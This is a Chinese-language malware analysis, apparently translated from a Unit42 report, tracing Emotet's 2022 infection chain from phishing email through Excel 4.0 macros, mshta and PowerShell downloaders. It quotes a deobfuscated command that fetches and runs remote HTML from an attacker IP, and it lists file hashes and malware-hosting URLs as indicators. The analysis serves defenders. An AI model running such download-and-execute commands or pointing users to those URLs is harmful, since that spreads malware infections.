Emotet 曾经是恶意软件领域的霸主，经常变换攻击模式。在 2021 年年底，研究人员就发现 Emotet 启用了一种新的攻击方法。

攻击通过带有恶意 Excel 文件的鱼叉邮件发起，Excel 文档中包含混淆的 Excel 4.0 宏。激活宏代码后，样本会下载并执行一个 HTML
应用程序，再下载后续的 PowerShell 脚本以及 Emotet 恶意样本。

## “光辉”历史

Emotet 最早在 2014 年被发现，此后一直保持活跃。2021 年 1 月，执法机构关停了 Emotet
在全球的基础设施。该恶意软件一度销声匿迹，但在 2021 年 11 月 Emotet 正式回归。

Emotet 经常使用线程劫持发起攻击，据此 Emotet 可以在失陷主机的 Emotet 邮件客户端中为正常电子邮件生成伪造回复邮件。

Emotet 自从回归后使用了不同的攻击方法。2021 年 12 月，Emotet 在恶意邮件中携带了下载虚假的 Adobe 应用程序安装包的恶意链接。而在
2022 年，Emotet 转而使用带有恶意附件的电子邮件进行攻击。

有时候，Emotet 使用加密的 ZIP 文件作为附件文件。有时候，直接将 Excel 文件作为附件。

## 电子邮件

Emotet 发现了一封 2021 年 6 月的电子邮件，在 2022 年 1 月 27
日发送了一封虚假的回复邮件。邮件带有加密的压缩文件，而密码在邮件中提供。

![image.png-428.4kB](https://image.3001.net/images/20220221/1645442329_6213751916bcfa0605f67.png!small)电子邮件

## 诱饵文档

加密的压缩文件中包含一个带有 Excel 4.0 宏的 Excel 文件，并且显著提示用户要启用宏。

![image.png-143.3kB](https://image.3001.net/images/20220221/1645442330_6213751a34ac61682b778.png!small)诱饵文档

宏被启用后，执行 `cmd.exe`运行 `mshta.ext`。利用十六进制和字符混淆来绕过静态检测措施，去混淆后为 `cmd /c mshta
hxxp://91.240.118.168/se/s.html`。

![image.png-90.7kB](https://image.3001.net/images/20220221/1645442330_6213751ae7310ca63b76e.png!small)宏代码

HTML 文件是高度混淆的，执行会下载额外的 PowerShell 代码。

![image.png-113.6kB](https://image.3001.net/images/20220221/1645442331_6213751b5f7d3c4e38445.png!small)混淆
HTML 应用程序

## PowerShell

混淆的 PowerShell 脚本通过 `hxxp://91.240.118.168/se/s.png`下载拉取 Emotet 的第二个
PowerShell 脚本。

![image.png-394.6kB](https://image.3001.net/images/20220221/1645442331_6213751bed44cc65c6edd.png!small)PowerShell
代码

第二个 PowerShell 脚本中包含 14 个 URL，脚本会尝试每个 URL 来下载 Emotet 恶意样本。部署多个 URL
使得攻击基础设施的弹性更好。

![image.png-606.4kB](https://image.3001.net/images/20220221/1645442332_6213751cea549af536592.png!small)拉取流量

攻击链的最后，通过 DLL 加密资源段加载 Emotet 执行。

![image.png-1916.2kB](https://image.3001.net/images/20220221/1645442335_6213751f127cfd1c100ea.png!small)Emotet
样本

## 结论

Emotet 是一个高度活跃的家族，为了逃避检测会经常变换打法。最新的攻击链显示，Emotet 会综合使用多种类型的文件和高度混淆的脚本发起攻击。

## IOC

> 9f22626232934970e4851467b7b746578f0f149984cd0e4e1a156b391727fac9  
> 6d55f25222831cce73fd9a64a8e5a63b002522dc2637bd2704f77168c7c02d88  
> 9bda03babb0f2c6aa9861eca95b33af06a650e2851cce4edcc1fc3abd8e7c2a1  
> 5bd4987db7e6946bf2ca3f73e17d6f75e2d8217df63b2f7763ea9a6ebcaf9fed  
> 2de72908e0a1ef97e4e06d8b1ba3dc0d76f580cdf36f96b5c919bea770b2805f  
> hxxp://unifiedpharma.com/wp-content/5arxM/  
> hxxp://hotelamerpalace.com/Fox-C404/LEPqPJpt4Gbr8BHAn/  
> hxxps://connecticutsfinestmovers.com/Fox-C/mVwOqxT17gVWaE8E/  
> hxxp://icfacn.com/runtime/n7qA2YStudp/  
> hxxps://krezol-group.com:443/images/PmLGLKYeCBs5d/  
> hxxp://ledcaopingdeng.com/wp-includes/Qq39yj7fpvk/  
> hxxp://autodiscover.karlamejia.com/wp-admin/hcdnVlRIiwvTVrJjJEE/  
> hxxps://crmweb.info:443/bitrix/rc9XjtwF/  
> hxxp://accessunited-bank.com/admin/hzIgVwq8btak/  
> hxxp://pigij.com/wp-admin/MVW5/  
> hxxp://artanddesign.one/wp-content/uploads/A2cZL7/  
> hxxp://strawberry.kids-singer.net/assets_c/WAdvNT84Dmu/  
> hxxps://eleccom.shop:443/services/AEjSDj/  
> hxxps://izocab.com/nashi-klienty/B5SC/

## 参考来源

> [Unit42](https://unit42.paloaltonetworks.com/new-emotet-infection-method/)

